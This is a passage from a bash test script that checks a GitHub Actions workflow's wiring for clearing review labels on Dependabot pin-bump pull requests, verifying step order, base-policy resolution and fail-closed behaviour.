  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-malformed.json" ok "$LANE_EVIDENCE"; rc_malformed=$?
  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" ok '{"exempt":false}'; rc_evidence=$?
  set -e
  if [ "$rc_read" -ne 0 ] && [ "$rc_malformed" -ne 0 ] && [ "$rc_evidence" -ne 0 ] && [ ! -f "$LANE_DIR/comment-writes" ]; then
    pass "diagnostic step fails closed on an unreadable pair, a malformed pair, or non-exempt evidence, without writing"
  else
    fail "diagnostic step did not fail closed (read=$rc_read malformed=$rc_malformed evidence=$rc_evidence)"
  fi

  # auto-clear: both clearing loops consult the lane before the merge gate.
  for job in evaluate-and-clear scheduled-sweep; do
    LOOP=$(yq -r ".jobs.\"$job\".steps[] | select(.run != null) | select(.run | test(\"codex-review-check.sh \\\"\\\\\$PR\\\"\")) | .run" "$AUTO_CLEAR_WORKFLOW")
    if [ -z "$LOOP" ]; then
      fail "auto-clear $job: could not locate the clearing loop step"
      continue
    fi
    helper_line=$(grep -n 'bash scripts/workflow/dependabot_pin_bump_exemption.sh' <<<"$LOOP" | head -1 | cut -d: -f1)
    gate_line=$(grep -n 'scripts/codex-review-check.sh "$PR"' <<<"$LOOP" | head -1 | cut -d: -f1)
    retract_line=$(grep -n -- '--retract-unsafe-only "$PR" "$REPO"' <<<"$LOOP" | head -1 | cut -d: -f1)
    fence_line=$(grep -n -F "live_pair=\$(GH_TOKEN=\"\$WORKFLOW_TOKEN\" gh api \"repos/\$REPO/pulls/\$PR\"" <<<"$LOOP" | head -1 | cut -d: -f1)
    delete_line=$(grep -n -- '-X DELETE -i --silent' <<<"$LOOP" | head -1 | cut -d: -f1)
    if [ -n "$helper_line" ] && [ -n "$gate_line" ] && [ -n "$delete_line" ] \
       && [ "$helper_line" -lt "$gate_line" ] && [ "$gate_line" -lt "$delete_line" ] \
       && [ -n "$retract_line" ] && [ -n "$fence_line" ] \
       && [ "$retract_line" -lt "$fence_line" ] && [ "$fence_line" -lt "$delete_line" ] \
       && grep -Fq "proven_pair=\$(jq -r '[.head, .base] | @tsv' <<<\"\$PIN_JSON\")" <<<"$LOOP" \
       && grep -Fq '[ "$live_pair" != "$proven_pair" ]' <<<"$LOOP" \
       && grep -Fq 'PIN_JSON=$(GH_TOKEN="$WORKFLOW_TOKEN" bash scripts/workflow/dependabot_pin_bump_exemption.sh' <<<"$LOOP" \
       && grep -Fq -- '--repo "$REPO" --pr "$PR" --head "$LANE_HEAD" --base "$LANE_BASE" --config "$LANE_POLICY")' <<<"$LOOP" \
       && ! grep -Fq -- '--config .github/review-policy.yml)' <<<"$LOOP" \
       && grep -Fq 'gate_source=dependabot-pin-bump' <<<"$LOOP" \
       && grep -Fq 'mergepath-dependabot-pin-bump:v1 verified-head=' <<<"$LOOP"; then
      pass "auto-clear $job: runs the trusted pin-bump helper under the workflow token before the merge gate, re-fences the proven pair before the DELETE, and attributes the removal to the lane"
    else
      fail "auto-clear $job: the pin-bump lane must run before codex-review-check.sh, re-fence before the DELETE, and read the governing base policy (helper=$helper_line gate=$gate_line retract=$retract_line fence=$fence_line delete=$delete_line)"
    fi
    # The governing policy is the live base's, and only a policy-applied label
    # is the lane's to clear: both are established BEFORE the helper runs.
    policy_line=$(grep -n 'bash scripts/workflow/resolve_base_policy.sh' <<<"$LOOP" | head -1 | cut -d: -f1)
    owner_line=$(grep -n 'gh api --paginate "repos/$REPO/issues/$PR/timeline"' <<<"$LOOP" | head -1 | cut -d: -f1)
    triple_line=$(grep -n -F 'LANE_TRIPLE=$(GH_TOKEN="$WORKFLOW_TOKEN" gh api "repos/$REPO/pulls/$PR"' <<<"$LOOP" | head -1 | cut -d: -f1)
    owner_line=$(grep -n 'LANE_OWNER=$(lane_latest_label_event)' <<<"$LOOP" | head -1 | cut -d: -f1)
    if [ -n "$triple_line" ] && [ -n "$policy_line" ] && [ -n "$owner_line" ] && [ -n "$helper_line" ] \
       && [ "$triple_line" -lt "$policy_line" ] && [ "$policy_line" -lt "$owner_line" ] && [ "$owner_line" -lt "$helper_line" ] \
       && grep -Fq -- '--repo "$REPO" --base-ref "$LANE_BASE_REF" --base-sha "$LANE_BASE"' <<<"$LOOP" \
       && grep -Fq -- '--default-branch "$DEFAULT_BRANCH" --default-config .github/review-policy.yml' <<<"$LOOP" \
       && ! grep -Fq -- 'resolve_base_policy.sh --repo "$REPO" --pr' <<<"$LOOP" \
       && grep -Fq "[ \"\$LANE_OWNER\" != 'labeled:github-actions[bot]' ]" <<<"$LOOP" \
       && grep -Fq '"\(.event):\(.actor.login // "<unknown>")"' <<<"$LOOP"; then
      pass "auto-clear $job: captures one live pair, resolves the policy at that base, and requires a policy-applied label before consulting the lane"
    else
      fail "auto-clear $job: must capture the live triple first, resolve the base policy pinned to it, and check the latest label event before the helper (triple=$triple_line policy=$policy_line owner=$owner_line helper=$helper_line)"
    fi
    # The resolver's default-base shortcut returns the checkout's own policy
    # and ignores --base-sha unless --materialize-default is passed, so the
    # pin is only real with that flag on the SAME call (round-4 finding).
    resolver_call=$(awk '/LANE_POLICY=\$\(GH_TOKEN="\$WORKFLOW_TOKEN" bash scripts\/workflow\/resolve_base_policy.sh/{f=1} f{print} f && /\)[[:space:]]*$/{exit}' <<<"$LOOP")
    if grep -Fq -- '--base-sha "$LANE_BASE"' <<<"$resolver_call" \
       && grep -Fq -- '--materialize-default' <<<"$resolver_call"; then
      pass "auto-clear $job: the base policy is materialized at the captured base SHA, including for a default-branch base"
    else
      fail "auto-clear $job: the resolver call must pass --materialize-default with --base-sha, or a default-base PR is judged by the checkout's policy: $resolver_call"
    fi
    # Non-Dependabot PRs short-circuit from the same single PR read, before
    # the policy materialization and the timeline read, so the sweep spends
    # no extra installation-token reads on ordinary labeled PRs.
    author_line=$(grep -n -F "elif [ \"\$LANE_AUTHOR\" != 'dependabot[bot]' ]; then" <<<"$LOOP" | head -1 | cut -d: -f1)
    if grep -Fq "[.head.sha, .base.sha, .base.ref, .user.login] | @tsv" <<<"$LOOP" \
       && [ -n "$author_line" ] && [ -n "$triple_line" ] && [ -n "$policy_line" ] \
       && [ "$triple_line" -lt "$author_line" ] && [ "$author_line" -lt "$policy_line" ]; then
      pass "auto-clear $job: a non-Dependabot PR leaves the lane from the single PR read, before any policy or timeline read"
    else
      fail "auto-clear $job: the author check must come from the captured PR read and precede the policy materialization (triple=$triple_line author=$author_line policy=$policy_line)"
    fi
    # The pre-delete fence re-reads BOTH the pair (against the captured one)
    # and the label ownership.
    fence_owner_line=$(grep -n 'live_owner=$(lane_latest_label_event)' <<<"$LOOP" | head -1 | cut -d: -f1)
    if [ -n "$fence_owner_line" ] && [ -n "$fence_line" ] && [ -n "$delete_line" ] \
       && [ "$fence_line" -lt "$fence_owner_line" ] && [ "$fence_owner_line" -lt "$delete_line" ] \
       && grep -Fq "[ \"\$live_owner\" != 'labeled:github-actions[bot]' ]" <<<"$LOOP" \
       && grep -Fq 'captured_pair=$(printf '"'"'%s\t%s'"'"' "$LANE_HEAD" "$LANE_BASE")' <<<"$LOOP" \
       && grep -Fq '[ "$live_pair" != "$captured_pair" ]' <<<"$LOOP"; then
      pass "auto-clear $job: the pre-delete fence re-reads the pair against the captured one and the label ownership"
    else
      fail "auto-clear $job: the pre-delete fence must re-check both the captured pair and the label ownership (fence=$fence_line owner=$fence_owner_line delete=$delete_line)"
    fi
    STEP_ENV=$(yq -r ".jobs.\"$job\".steps[] | select(.run != null) | select(.run | test(\"codex-review-check.sh \\\"\\\\\$PR\\\"\")) | .env.DEFAULT_BRANCH // \"\"" "$AUTO_CLEAR_WORKFLOW")
    if [ "$STEP_ENV" = '${{ github.event.repository.default_branch }}' ]; then
      pass "auto-clear $job: the clearing step exports DEFAULT_BRANCH for the base-pinned policy resolution"
    else
      fail "auto-clear $job: DEFAULT_BRANCH env missing on the clearing step (got '$STEP_ENV')"
    fi
    # rc 3 → infra sentinel; rc 1 → ordinary merge-gate evaluation.
    arm=$(awk '/case "\$pin_rc" in/{f=1} f{print} f && /^[[:space:]]*esac[[:space:]]*$/{exit}' <<<"$LOOP")
    if grep -Fq 'rc=3' <<<"$arm" && grep -Fq 'rc=0' <<<"$arm" \
       && awk '/^[[:space:]]*1\)/{f=1} f && /codex-review-check.sh "\$PR"/{found=1} f && /;;/{exit} END{exit found?0:1}' <<<"$arm"; then
      pass "auto-clear $job: an unreachable lane verdict is an infrastructure error and a not-applicable verdict falls through to the merge gate"
    else
      fail "auto-clear $job: pin_rc mapping is wrong: $arm"
    fi
  done
else
  echo "SKIP: workflow wiring assertions (yq or a workflow is unavailable)"
fi

echo "test_dependabot_auto_merge_check_wait: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
